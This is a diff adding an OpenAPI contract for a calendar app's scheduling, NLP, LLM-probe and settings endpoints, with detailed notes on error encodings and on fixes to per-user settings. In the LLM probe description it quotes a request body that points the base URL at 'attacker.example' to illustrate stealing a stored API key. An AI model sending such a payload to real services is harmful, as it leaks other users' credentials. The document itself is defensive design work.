@@ -1,0 +1,2138 @@
+# Domain: scheduling
+# Source of truth: backend/api/routes.go, handlers_focus.go, handlers_schedule.go,
+# handlers_nlp.go, handlers_llm.go, handlers_settings.go, handlers_daily_recap.go,
+# backend/engine/{focus_time,compression,smart_schedule,daily_recap}.go,
+# backend/nlp/{parser,llm_factory}.go, backend/storage/settings.go.
+#
+# All routes below are registered inside the `requireAuth(jwtSecret)` chi group in
+# routes.go, so they inherit the global default security scheme (no per-operation
+# `security` key is written here, by instruction).
+#
+# Two distinct error encodings exist in this domain and are NOT interchangeable:
+#   * writeError()  -> application/json, body {"error": "<msg>"}  (handlers_settings.go:206)
+#   * http.Error()  -> text/plain; charset=utf-8, body "<msg>\n"  (Go stdlib overwrites
+#                      any Content-Type the handler set beforehand)
+# Each response below states which one the handler actually uses.
+#
+# Nil-slice caveat: Go encodes a nil slice as JSON `null`, not `[]`. Every array-typed
+# field produced by these handlers from an un-appended slice is therefore nullable.
+
+paths:
+  /api/focus/run:
+    post:
+      operationId: runFocus
+      tags: [focus]
+      summary: Run the focus-time engine for a week
+      description: >
+        Creates focus blocks for the target week. The request body is decoded
+        best-effort: if the body is absent or is malformed JSON the handler
+        silently falls back to `week = ""` (i.e. the current week) and returns
+        200 - it does NOT return 400 for malformed JSON. A 400 is only produced
+        when `week` decodes to a non-empty string that fails
+        `time.Parse("2006-01-02", ...)`.
+      requestBody:
+        required: false
+        content:
+          application/json:
+            schema:
+              $ref: '#/components/schemas/FocusRunRequest'
+      responses:
+        '200':
+          description: Focus run result
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/FocusRunResult'
+        '400':
+          description: >
+            `invalid week format, use YYYY-MM-DD` - JSON error shape (writeError).
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/SchedulingErrorResponse'
+        '500':
+          description: >
+            Engine failure. Written with http.Error, so the body is the raw Go
+            error string as text/plain, NOT the JSON error shape.
+          content:
+            text/plain:
+              schema:
+                type: string
+
+  /api/focus/blocks:
+    get:
+      operationId: listFocusBlocks
+      tags: [focus]
+      summary: List persisted focus blocks for a week
+      description: >
+        Returns rows from the `focus_blocks` table where
+        `date >= week AND date < week+7days`, ordered by start_time.
+        NOTE: `storage.FocusBlock` carries no json struct tags, so the encoder
+        emits Go field names (`ID`, `GoogleEventID`, `StartTime`, `EndTime`,
+        `Date`, `CreatedAt`) - not snake_case and not camelCase.
+      parameters:
+        - name: week
+          in: query
+          required: false
+          description: >
+            Week anchor date, format `YYYY-MM-DD` (Go layout "2006-01-02").
+            Omitted or empty -> `time.Now()`. The value is used verbatim as the
+            lower bound; it is NOT snapped to Monday (unlike
+            POST /api/schedule/compress, which does snap via startOfWeek()).
+          schema:
+            type: string
+            format: date
+            example: '2025-01-06'
+      responses:
+        '200':
+          description: >
+            Focus block rows. `null` (not `[]`) when the week has no rows,
+            because the handler encodes a nil slice.
+          content:
+            application/json:
+              schema:
+                type: array
+                nullable: true
+                items:
+                  $ref: '#/components/schemas/FocusBlockRecord'
+        '400':
+          description: '`invalid week format` - JSON error shape (writeError).'
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/SchedulingErrorResponse'
+        '500':
+          description: DB failure, raw Go error as text/plain (http.Error).
+          content:
+            text/plain:
+              schema:
+                type: string
+    delete:
+      operationId: clearFocusBlocks
+      tags: [focus]
+      summary: Delete the focus blocks of a week
+      parameters:
+        - name: week
+          in: query
+          required: false
+          description: >
+            Week anchor date, `YYYY-MM-DD`. Omitted -> `time.Now()`.
+          schema:
+            type: string
+            format: date
+      responses:
+        '200':
+          description: Number of deleted blocks.
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/FocusClearResult'
+        '400':
+          description: '`invalid week format` - JSON error shape (writeError).'
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/SchedulingErrorResponse'
+        '500':
+          description: Engine failure, raw Go error as text/plain (http.Error).
+          content:
+            text/plain:
+              schema:
+                type: string
+
+  /api/schedule/compress:
+    post:
+      operationId: previewCompression
+      tags: [schedule]
+      summary: Preview meeting-compression proposals
+      description: >
+        Body decode errors are swallowed (`_ = json.NewDecoder(...).Decode(&body)`),
+        so malformed JSON behaves like an empty body and yields 200 for today.
+        If `week` is set it wins over `date`: the handler snaps the parsed date to
+        Monday (startOfWeek) and iterates Mon..Fri, appending one CompressionResult
+        per day and SILENTLY SKIPPING days whose engine call errors - so week mode
+        never returns 500, and can return `null` if all five days error.
+        If `week` is empty, `date` (or today) produces a single-element array and
+        an engine error becomes a 500.
+      requestBody:
+        required: false
+        content:
+          application/json:
+            schema:
+              $ref: '#/components/schemas/CompressionRequest'
+      responses:
+        '200':
+          description: >
+            Array of per-day results. `null` when the slice stayed empty
+            (week mode with every day failing).
+          content:
+            application/json:
+              schema:
+                type: array
+                nullable: true
+                items:
+                  $ref: '#/components/schemas/CompressionResult'
+        '400':
+          description: >
+            `invalid week format` or `invalid date format` - JSON error shape
+            (writeError).
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/SchedulingErrorResponse'
+        '500':
+          description: >
+            Single-day mode only. Raw Go error as text/plain (http.Error).
+          content:
+            text/plain:
+              schema:
+                type: string
+
+  /api/schedule/compress/apply:
+    post:
+      operationId: applyCompression
+      tags: [schedule]
+      summary: Apply selected move proposals
+      description: >
+        The request proposal objects are snake_case (`event_id`,
+        `proposed_start`, `proposed_end`) even though the CompressionResult
+        proposals returned by /api/schedule/compress are camelCase. Only these
+        three fields are read; any other field on the posted object is ignored.
+        A proposal whose start or end fails RFC3339 parsing is NOT an error: it
+        is dropped and `"<event_id>: invalid time format"` is appended to
+        `failed` (confirmed by TestApplyCompress_InvalidTime, which expects 200).
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              $ref: '#/components/schemas/CompressionApplyRequest'
+      responses:
+        '200':
+          description: Applied / failed event ids.
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/CompressionApplyResult'
+        '400':
+          description: '`invalid JSON` - JSON error shape (writeError).'
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/SchedulingErrorResponse'
+        '500':
+          description: Engine Apply() error, raw Go error as text/plain (http.Error).
+          content:
+            text/plain:
+              schema:
+                type: string
+
+  /api/schedule/suggest:
+    post:
+      operationId: suggestMeetingSlots
+      tags: [schedule]
+      summary: Suggest meeting slots
+      description: >
+        `range_start` and `range_end` are both mandatory and must parse as
+        RFC3339; either one failing yields a single 400. `duration_minutes`,
+        `attendees` and `title` are optional as far as the handler is concerned
+        (no validation) - `duration_minutes: 0` produces zero-length candidate
+        slots rather than an error.
+        The engine walks candidate starts in 30-minute steps
+        (engine/smart_schedule.go: `t = t.Add(30 * time.Minute)`) and returns at
+        most 3 slots, each at least 1h apart (pickTopUnique(candidates, 3, time.Hour)).
+      x-uncertain: >
+        The task brief mentions a 15-minute increment rule. No 15-minute
+        constraint exists anywhere on this route: the smart scheduler steps 30
+        minutes, and the only 15-minute stepping in the repo is in
+        engine/booking.go, engine/habits.go and engine/team_availability.go,
+        which back other domains (booking links, habits, team availability).
+        A human should confirm whether a 15-minute rule was intended here.
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              $ref: '#/components/schemas/ScheduleSuggestRequest'
+      responses:
+        '200':
+          description: Ranked slot suggestions.
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/ScheduleSuggestions'
+        '400':
+          description: >
+            `invalid JSON`, or
+            `invalid range_start or range_end (use RFC3339)` - JSON error shape
+            (writeError).
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/SchedulingErrorResponse'
+        '500':
+          description: >
+            Engine error (freebusy failure, settings load, or the out-of-hours
+            allowance counter). Raw Go error as text/plain (http.Error).
+          content:
+            text/plain:
+              schema:
+                type: string
+
+  /api/schedule/create:
+    post:
+      operationId: createScheduledMeeting
+      tags: [schedule]
+      summary: Create a meeting at an explicit time
+      description: >
+        `start` and `end` must both parse as RFC3339. The handler builds an
+        `engine.ScheduleRequest` WITHOUT `duration_minutes` (the slot carries the
+        times) and calls SmartScheduler.CreateMeeting, which refuses out-of-hours
+        creation once the weekly allowance is spent - that refusal surfaces as a
+        500 with the text `out-of-hours meeting allowance reached`, not a 4xx.
+        On success an audit row `meeting_created` is written.
+        The response body is the raw Google Calendar API
+        `calendar/v3.Event` struct as returned by the calendar client - it is
+        NOT normalised into the app's own event shape.
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              $ref: '#/components/schemas/ScheduleCreateRequest'
+      responses:
+        '200':
+          description: The created Google Calendar event.
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/GoogleCalendarEvent'
+        '400':
+          description: >
+            `invalid JSON`, or `invalid start or end (use RFC3339)` - JSON error
+            shape (writeError).
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/SchedulingErrorResponse'
+        '500':
+          description: Calendar/engine error, raw Go error as text/plain (http.Error).
+          content:
+            text/plain:
+              schema:
+                type: string
+
+  /api/nlp/parse:
+    post:
+      operationId: parseNaturalLanguage
+      tags: [nlp]
+      summary: Parse a natural-language scheduling request
+      description: >
+        A malformed body and an empty `text` are collapsed into the same 400
+        (`missing text field`). Note that LLM-level failures inside the parser
+        do NOT surface as 5xx: the parser returns
+        `{"intent":"unknown","error":"..."}` with HTTP 200. A 500 only occurs
+        when Parse() itself returns a non-nil error.
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              $ref: '#/components/schemas/NLPParseRequest'
+      responses:
+        '200':
+          description: Parse result.
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/NLPParseResult'
+        '400':
+          description: '`missing text field` - JSON error shape (writeError).'
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/SchedulingErrorResponse'
+        '500':
+          description: Parser error, raw Go error as text/plain (http.Error).
+          content:
+            text/plain:
+              schema:
+                type: string
+
+  /api/nlp/confirm:
+    post:
+      operationId: confirmNaturalLanguage
+      tags: [nlp]
+      summary: Create the meeting for a chosen parsed slot
+      description: >
+        The whole ParseResult from /api/nlp/parse is echoed back. Only
+        `title`, `attendees`, `constraints` (mapped to the event Description)
+        and `suggested_slots[selected_slot_index]` are used; `duration_minutes`,
+        `range_start`, `range_end`, `preferred_times` and `avoid_times` are
+        ignored here. On success an audit row `nlp_confirmed` is written and the
+        raw Google Calendar event is returned.
+      x-uncertain: >
+        The bounds check is `len(SuggestedSlots) == 0 || SelectedSlotIndex >= len(...)`.
+        A NEGATIVE `selected_slot_index` passes validation and then indexes the
+        slice out of range, which panics. The panic is re-raised by
+        sentryMiddleware and becomes a generic 500 from net/http - it is not a
+        400. A human should confirm whether this is intended before the spec
+        documents a 400 for negative indexes.
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              $ref: '#/components/schemas/NLPConfirmRequest'
+      responses:
+        '200':
+          description: The created Google Calendar event.
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/GoogleCalendarEvent'
+        '400':
+          description: >
+            `invalid JSON`, or `invalid selected_slot_index` (empty slot list, or
+            index >= len). JSON error shape (writeError).
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/SchedulingErrorResponse'
+        '500':
+          description: >
+            CreateMeeting error as text/plain (http.Error), or an empty-body
+            panic-derived 500 for a negative index (see x-uncertain).
+          content:
+            text/plain:
+              schema:
+                type: string
+
+  /api/llm/test:
+    post:
+      operationId: testLLMConnection
+      tags: [llm]
+      summary: Probe an LLM provider configuration
+      description: >
+        Probes a provider configuration by issuing a fixed completion
+        (system "You are a helpful assistant.", user "Say hello").
+
+        PAC-24 resolves API-037. **THE DESTINATION IS NEVER SUPPLIED BY THE
+        CALLER.** Every value that contributes to the URL this server requests —
+        `llmBaseUrl`, `ollamaBaseUrl`, `azureEndpoint`, `azureDeployment`,
+        `azureApiVersion`, `awsRegion`, `awsProfile`, `bedrockModel`,
+        `gcpProject`, `gcpLocation`, `vertexModel` — is read from the CALLER'S
+        OWN stored settings and from nowhere else. The request body may carry
+        only `llmProvider`, `llmModel` and `llmApiKey`, none of which reaches a
+        URL (`backend/nlp/llm_factory.go:13-58`: `llmModel` is consulted only by
+        the `openai` and `anthropic` branches, where it is a JSON body field, and
+        `llmApiKey` only as an `Authorization` header value).
+
+        This is a security property of the contract, not a convenience, and the
+        invariant is: **a credential the caller did not supply is never sent to a
+        destination the caller did supply — because the caller cannot supply a
+        destination at all.** An earlier draft of this contract let a body
+        override each endpoint property individually with per-property fallback
+        to the stored values. That let
+        `{"llmProvider":"openai","llmBaseUrl":"https://attacker.example"}` pair a
+        caller-chosen host with the stored key:
+        `nlp.NewLLMClientFromSettings` builds
+        `OpenAIClient{APIKey: s.LLMAPIKey, BaseURL: s.LLMBaseURL}`
+        (`backend/nlp/llm_factory.go:29`) and `OpenAIClient.Complete` POSTs to
+        `base + "/v1/chat/completions"` with `Authorization: Bearer <key>`
+        (`backend/nlp/parser.go:31,43`), so the stored key would leave the
+        deployment and the 200/502 would confirm delivery. An all-or-nothing
+        body (supply the endpoint AND the key together) does not close it either:
+        on the `azure_openai`, `bedrock` and `vertex` branches the credential is
+        AMBIENT and cannot be submitted —
+        `AzureOpenAIClient.Complete` mints a token with
+        `azidentity.NewDefaultAzureCredential` and sends it as
+        `Authorization: Bearer <token>` to `c.Endpoint`
+        (`backend/nlp/llm_azure_openai.go:28-50`) — so any submitted endpoint is
+        necessarily paired with a credential the caller did not supply. Refusing
+        submitted destinations outright is the only shape that holds for all six
+        providers.
+
+        What the body IS for: verifying a key that has not been saved, now that a
+        stored key can never be read back (see `SettingsFields.llmApiKey`), and
+        naming which provider the result is about (spec AC-15). An absent body,
+        or `{}`, probes the caller's stored configuration entirely — the
+        pre-PAC-24 behaviour.
+
+        Before PAC-24 the handler never read r.Body at all and always probed the
+        SINGLETON settings row, so this operation reported on the deployment's
+        saved configuration rather than on the caller's (API-002, API-037).
+
+        No response on any status carries the submitted or the stored
+        `llmApiKey`. The provider's own error text is still echoed on 502 — that
+        is API-054 / T8 and is NOT resolved here; the narrower guarantee PAC-24
+        adds is that the key itself never appears (spec AC-14).
+
+        NOT resolved here, and recorded rather than silently fixed (factory §7):
+        a caller can still steer this probe indirectly by first writing
+        `llmBaseUrl` or `azureEndpoint` into their OWN settings via
+        `PATCH /api/settings` and then probing. That path exists today via
+        the pre-PAC-24 `PUT /api/settings` plus this operation, PAC-24 neither opens
+        nor closes it (the write is now `PATCH`), and on
+        the ambient-credential providers it reaches a deployment-wide cloud
+        identity rather than the caller's own key. It needs its own issue
+        (allow-listing or scheme/host restriction on the endpoint properties);
+        see `contracts/features/PAC-24.md` §2.
+      requestBody:
+        required: false
+        content:
+          application/json:
+            schema:
+              $ref: '#/components/schemas/LLMTestRequest'
+      responses:
+        '200':
+          description: Provider reachable.
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/LLMTestResult'
+        '400':
+          description: >
+            Malformed JSON body; a body naming an `llmProvider` outside the
+            permitted set; or a body carrying any property other than
+            `llmProvider`, `llmModel` and `llmApiKey`
+            (`additionalProperties: false`). The last case is how a caller
+            attempting to supply a destination - `llmBaseUrl`, `azureEndpoint`,
+            `ollamaBaseUrl`, … - is refused, and it must be refused here rather
+            than ignored, so that a client is told its override did nothing
+            instead of being left to believe it probed what it named.
+            JSON error shape (writeError). The response never contains the
+            submitted or the stored `llmApiKey` (spec AC-14).
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/SchedulingErrorResponse'
+        '500':
+          description: >
+            Two different encodings share this code. Settings load failure ->
+            text/plain (http.Error). Client construction failure (e.g.
+            `LLM not configured - set API key in Settings`) -> JSON error shape
+            (writeError).
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/SchedulingErrorResponse'
+            text/plain:
+              schema:
+                type: string
+        '502':
+          description: >
+            The provider call failed. JSON error shape (writeError) carrying the
+            upstream error string.
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/SchedulingErrorResponse'
+
+  /api/settings:
+    get:
+      operationId: getSettings
+      tags: [settings]
+      summary: Read the caller's settings document
+      description: >
+        Registered as `r.Route("/api/settings", ...)` + `r.Get("/", ...)`, so chi
+        serves both `/api/settings` and `/api/settings/`.
+
+        Returns the settings of the AUTHENTICATED CALLER. When the caller has no
+        settings row yet, one is created from the SQL defaults and returned, so
+        this operation never 404s and a second read returns the same row rather
+        than creating another (spec AC-2).
+
+        `llmApiKey` is never returned, by this or any other operation
+        (`writeOnly: true`). `llmApiKeySet` reports whether a key is on file
+        (spec AC-11, AC-12).
+
+        Before PAC-24 this read `WHERE id = 1` - a row shared by every
+        authenticated caller, which after migration 018's backfill is the
+        earliest-created user's own row - and returned `llmApiKey` in cleartext
+        (API-002, API-003).
+      responses:
+        '200':
+          description: The settings document.
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/Settings'
+        '500':
+          description: DB failure, raw Go error as text/plain (http.Error).
+          content:
+            text/plain:
+              schema:
+                type: string
+    patch:
+      operationId: patchSettings
+      tags: [settings]
+      summary: Change some of the caller's settings
+      description: >
+        MERGE, at the top level, against the CALLER'S OWN settings. This is the
+        ONLY write operation for settings: PAC-24 removes `PUT /api/settings`
+        rather than retaining it as a deprecated alias, for the reasons in the
+        comment on this path and in `contracts/features/PAC-24.md` §3.
+
+        The rule is total and needs no knowledge of what is stored:
+
+        * **Property absent** -> unchanged.
+        * **Property present** -> set to exactly that value. `""`, `0` and
+          `false` are values, not absences: they clear, zero and disable. This is
+          how a setting is cleared, including `llmApiKey` (spec AC-7, AC-13).
+        * **Property present and `null`** -> 400. No property of this body is
+          nullable, so a null fails schema validation and nothing is stored
+          (spec AC-8).
+        * **`workingHours` and `lunchBreaks`** are replaced WHOLE when present -
+          there is no deep merge and no per-day merge, so a weekday omitted from
+          a supplied map is REMOVED. `lunchBreaks: {}` clears every per-day lunch
+          override (spec AC-9).
+        * **`llmApiKeySet` and `updatedAt`** are `readOnly`. They may be present -
+          a client that submits back a document it just read will include them -
+          and are ignored (spec AC-10).
+
+        The response is a fresh read of the caller's row, so it reflects
+        normalisation (e.g. `workingHours` defaulting) rather than the submitted
+        body, and it does not contain `llmApiKey`.
+
+        Before PAC-24 there was no PATCH; the only write was a full-replace PUT
+        that persisted every omitted field as its Go zero value (API-004).
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              $ref: '#/components/schemas/SettingsUpdate'
+      responses:
+        '200':
+          description: The re-read settings document for the caller.
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/Settings'
+        '400':
+          $ref: '#/components/responses/SettingsValidationError'
+        '500':
+          description: Save or re-read failure, text/plain (http.Error).
+          content:
+            text/plain:
+              schema:
+                type: string
+    # PUT /api/settings is REMOVED by PAC-24. Revision 1 of this contract
+    # retained it as a deprecated merge-semantics alias, on the argument that it
+    # shielded the pre-PAC-24 frontend during the factory's cross-repo window
+    # (README §1). That argument does not survive checking:
+    #   * The only PUT consumer is
+    #     `smart-calendar-flow/src/api/client.ts:813`, which sends
+    #     `settingsRequestBody(s)` - a spread of the snake_case `Settings` object
+    #     (`:550-563`), so the body carries `work_start`, `llm_api_key` and 24
+    #     more snake_case names. PUT and PATCH shared `SettingsUpdate`, which is
+    #     `additionalProperties: false`, so that body was a 400 on PUT exactly as
+    #     on PATCH. The alias covered nothing.
+    #   * `mcp/client.go` defines get/post/patch/delete and no PUT at all
+    #     (`:22,43,47,52`), and no MCP tool writes settings - `clockwise_get_settings`
+    #     (`mcp/tools.go:236`) is a GET. The MCP server is not a consumer.
+    #   * `e2e/tests/` contains no settings spec.
+    # A PUT whose omissions mean "unchanged" is not a replace, and `deprecated`
+    # documents an intention to remove, not a change of method semantics -
+    # generated clients and any intermediary reasoning about idempotency read the
+    # method. The old frontend's writes are silently discarded by the server
+    # today (API-013), so a 400 from the removed route is strictly more honest
+    # than a silent success. See `contracts/features/PAC-24.md` §3.
+
+  /api/settings/daily-recap:
+    get:
+      operationId: getDailyRecapSettings
+      tags: [daily-recap]
+      summary: Read the caller's daily-recap settings
+      description: >
+        A snake_case projection of seven `recap*` fields of the CALLER'S OWN
+        settings row - the same row GET /api/settings exposes in camelCase. The
+        two representations are hand-maintained and can drift
+        (`recapIncludeFocus` <-> `include_focus_blocks`).
+
+        Before PAC-24 this read the singleton row, so every user saw and edited
+        one shared recap configuration (API-002).
+      responses:
+        '200':
+          description: Daily-recap settings.
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/DailyRecapSettings'
+        '500':
+          description: '`db error` as text/plain (http.Error).'
+          content:
+            text/plain:
+              schema:
+                type: string
+    patch:
+      operationId: patchDailyRecapSettings
+      tags: [daily-recap]
+      summary: Partially update the caller's daily-recap settings
+      description: >
+        A partial update of the CALLER'S OWN recap settings. A property absent
+        from the body is left unchanged; a property present is applied. No
+        property is nullable, so an explicit `null` is a 400 - this matches
+        PATCH /api/settings (spec AC-8) and is a change: the handler's pointer
+        fields previously treated `null` as "leave unchanged", which made a
+        typo indistinguishable from an omission.
+
+        Returns 204 with an EMPTY body on success - it does not echo the new
+        state.
+
+        Before PAC-24 this patched the singleton row, and the underlying write
+        was a full-row write that also rewrote every NON-recap column of that
+        row from the values it had just read (API-002). It now writes only the
+        recap columns of the caller's row.
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              $ref: '#/components/schemas/DailyRecapPatch'
+      responses:
+        '204':
+          description: Updated. No body.
+        '400':
+          description: >
+            `invalid JSON`; `send_to must be 'dm' or 'channel'`; or - added by
+            PAC-24, previously a 500 from the Postgres TIME cast -
+            `send_time must be in HH:MM format`. Written with http.Error, so
+            these are text/plain, NOT the JSON error shape.
+          content:
+            text/plain:
+              schema:
+                type: string
+        '500':
+          description: '`db error` as text/plain (http.Error).'
+          content:
+            text/plain:
+              schema:
+                type: string
+
+  /api/settings/daily-recap/preview:
+    post:
+      operationId: previewDailyRecap
+      tags: [daily-recap]
+      summary: Render today's recap without sending it
+      description: >
+        Builds the Slack Block Kit payload for the authenticated user at
+        `time.Now()` and returns it. No request body is read. Nothing is sent to
+        Slack and no Slack connection is required.
+
+        Before PAC-24 the day's content was the caller's but the recap
+        configuration driving it (timezone, which sections to include) came from
+        the singleton row, so a preview could omit sections the caller had
+        enabled (API-002). Both now come from the caller's row.
+      responses:
+        '200':
+          description: Rendered Slack blocks.
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/DailyRecapPreview'
+        '500':
+          description: '`db error` as text/plain (http.Error).'
+          content:
+            text/plain:
+              schema:
+                type: string
+
+  /api/settings/daily-recap/test:
+    post:
+      operationId: sendDailyRecapTest
+      tags: [daily-recap]
+      summary: Send a test recap to Slack
+      description: >
+        Requires a stored `slack` workspace connection for the authenticated
+        user. Destination comes from the CALLER'S OWN stored settings
+        (`recapSendTo`, `recapChannelId`), not from the request - no request
+        body is read. The Slack call is bounded by a 10s context timeout.
+
+        Before PAC-24 the destination came from the singleton row, so a test
+        send could be addressed to a channel another user had configured
+        (API-002).
+      responses:
+        '200':
+          description: Sent.
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/DailyRecapTestResult'
+        '400':
+          description: >
+            `Slack not connected` (also returned when the workspace-connection
+            lookup errors for any other reason). text/plain (http.Error).
+          content:
+            text/plain:
+              schema:
+                type: string
+        '500':
+          description: '`db error` as text/plain (http.Error).'
+          content:
+            text/plain:
+              schema:
+                type: string
+        '502':
+          description: '`send error: <err>` as text/plain (http.Error).'
+          content:
+            text/plain:
+              schema:
+                type: string
+
+components:
+  responses:
+
+    SettingsValidationError:
+      description: >
+        Malformed JSON, or a value the server refuses. JSON error shape
+        (writeError). A body property set to `null` is refused here: no property
+        of SettingsUpdate is nullable (spec AC-8).
+
+        Messages that already exist:
+        `invalid JSON: <err>`;
+        `<field> must be in HH:MM format` (workStart/workEnd/lunchStart/lunchEnd);
+        `focusMinBlockMinutes must be positive`;
+        `focusMaxBlockMinutes must be positive`;
+        `focusDailyTargetMinutes must be positive`;
+        `outOfHoursMeetingsPerWeek must be zero or positive`;
+        `bufferBeforeMinutes must be positive`;
+        `bufferAfterMinutes must be positive`;
+        `autoScheduleCron must be a 5-part cron expression`;
+        `autoScheduleCron is invalid: <err>`;
+        `llmProvider must be one of: openai, anthropic, ollama, bedrock, azure_openai, vertex`;
+        `workingHours.mode must be all_days or by_day`;
+        `workingHours.mode is required when day-specific hours are provided`;
+        `workingHours.days.<day> is not a valid weekday`;
+        `lunchBreaks.<day> is not a valid weekday`;
+        `<field> requires start and end when enabled`;
+        `<field> start and end must be in HH:MM format`;
+        `<field> end must be after start`.
+
+        Messages PAC-24 adds, closing API-081 and API-082 - each of these is a
+        value the server accepted before and then failed on, silently or as a
+        500 (spec AC-17):
+        `workEnd must be after workStart`;
+        `lunchEnd must be after lunchStart`;
+        `focusMinBlockMinutes must not exceed focusMaxBlockMinutes`;
+        `bufferMinMeetingMinutes must be zero or positive`;
+        `timezone is not a known IANA location`;
+        `recapSendTo must be dm or channel` (previously reached the DB CHECK and
+        surfaced as a 500 - API-081);
+        `recapSendTime must be in HH:MM format` (previously reached the Postgres
+        TIME cast and surfaced as a 500);
+        `calendarProvider must be one of: google, outlook, webcal` (resolves
+        U-18);
+        `conferencingProvider must be one of: meet, zoom, teams`.
+
+        Messages revision 2 of this contract adds, each with its reason:
+        `recapSendTime must be in HH:MM format` now also covers `""`. The write
+        path previously substituted `08:00` for an empty value
+        (`recapSendTimeOrDefault`, `backend/storage/settings.go:356-361`); under
+        the merge rule a present property must be stored exactly as given, so a
+        silent substitution is a contract violation and the empty value is
+        refused instead. See `SettingsFields.recapSendTime`; this is the one
+        clock property for which `""` is NOT a value, and it needs a narrow
+        amendment to spec AC-7.
+        `workingHours.days must contain at least one weekday when mode is by_day`
+        - a `by_day` document with an empty `days` map is the only remaining
+        stored state that makes the consumer delete the working-hours section
+        with no error (`smart-calendar-flow/src/api/client.ts:505-517,543`); the
+        `all_days` equivalent is already normalised away on read
+        (`backend/storage/settings.go:95-99`). Serves spec AC-20.
+
+        Two messages in the list above become UNREACHABLE via the HTTP boundary
+        and remain only as defence in depth, because `propertyNames` now rejects
+        the request at schema validation:
+        `workingHours.days.<day> is not a valid weekday` and
+        `lunchBreaks.<day> is not a valid weekday`. The handler checks stay -
+        they are what `handlers_settings_schedule_test.go:41-49` asserts, and
+        spec §6 requires that test to keep passing unchanged.
+
+        `""` is NOT in this catalogue for `workStart`, `workEnd`, `lunchStart`
+        or `lunchEnd`. It is a valid value for all four, on read and on write
+        (spec AC-7); the handler already skips the format check for it
+        (`backend/api/handlers_settings.go:75`).
+      content:
+        application/json:
+          schema:
+            $ref: '#/components/schemas/SchedulingErrorResponse'
+
+  schemas:
+
+    # ---------------------------------------------------------------- errors
+
+    SchedulingErrorResponse:
+      type: object
+      description: >
+        The JSON error shape produced by api.writeError (handlers_settings.go:206).
+        Emitted with `Content-Type: application/json`. Handlers that use the Go
+        stdlib `http.Error` instead return text/plain and do NOT use this shape;
+        each response above says which applies.
+        The 401 from requireAuth is a hybrid: the body text is
+        `{"error":"unauthorized"}` but it is written through http.Error, which
+        overwrites the Content-Type to `text/plain; charset=utf-8`.
+      properties:
+        error:
+          type: string
+      required: [error]
+      additionalProperties: false
+
+    # ----------------------------------------------------------------- focus
+
+    FocusRunRequest:
+      type: object
+      description: >
+        Optional. A malformed body is silently treated as `{}`.
+      properties:
+        week:
+          type: string
+          format: date
+          description: >
+            `YYYY-MM-DD`. Empty or absent -> current week (`time.Now()`).
+            Not snapped to Monday by the handler.
+          example: '2025-01-06'
+      additionalProperties: true
+
+    FocusRunResult:
+      type: object
+      description: engine.FocusRunResult (backend/engine/focus_time.go). camelCase.
+      properties:
+        weekStart:
+          type: string
+          format: date-time
+          description: RFC3339 (Go time.Time).
+        createdBlocks:
+          type: array
+          nullable: true
+          description: '`null` when the engine created nothing.'
+          items:
+            $ref: '#/components/schemas/FocusRunBlock'
+        skippedDays:
+          type: array
+          nullable: true
+          items:
+            type: string
+          description: >
+            x-uncertain at field level - the format of each entry is not pinned
+            by a struct tag; it is whatever the engine appends.
+        totalMinutes:
+          type: integer
+        errors:
+          type: array
+          nullable: true
+          items:
+            type: string
+      required: [weekStart, createdBlocks, skippedDays, totalMinutes, errors]
+      additionalProperties: false
+
+    FocusRunBlock:
+      type: object
+      description: >
+        engine.FocusBlock. This struct has NO json tags, so the encoder emits
+        exported Go field names verbatim. It is a DIFFERENT shape from
+        FocusBlockRecord (storage.FocusBlock) returned by GET /api/focus/blocks.
+      properties:
+        GoogleEventID:
+          type: string
+        Start:
+          type: string
+          format: date-time
+        End:
+          type: string
+          format: date-time
+        Date:
+          type: string
+          format: date
+          description: '`YYYY-MM-DD`.'
+      required: [GoogleEventID, Start, End, Date]
+      additionalProperties: false
+
+    FocusBlockRecord:
+      type: object
+      description: >
+        storage.FocusBlock (backend/storage/models.go). No json tags either, so
+        the wire field names are the Go field names.
+      properties:
+        ID:
+          type: integer
+          format: int64
+        GoogleEventID:
+          type: string
+        StartTime:
+          type: string
+          format: date-time
+        EndTime:
+          type: string
+          format: date-time
+        Date:
+          type: string
+          format: date
+        CreatedAt:
+          type: string
+          format: date-time
+      required: [ID, GoogleEventID, StartTime, EndTime, Date, CreatedAt]
+      additionalProperties: false
+
+    FocusClearResult:
+      type: object
+      description: 'Literal `map[string]int{"deleted": n}`.'
+      properties:
+        deleted:
+          type: integer
+      required: [deleted]
+      additionalProperties: false
+
+    # ----------------------------------------------------------- compression
+
+    CompressionRequest:
+      type: object
+      description: >
+        Both fields optional; `week` takes precedence over `date` when non-empty.
+      properties:
+        date:
+          type: string
+          format: date
+          description: '`YYYY-MM-DD`. Used only when `week` is empty. Default: today.'
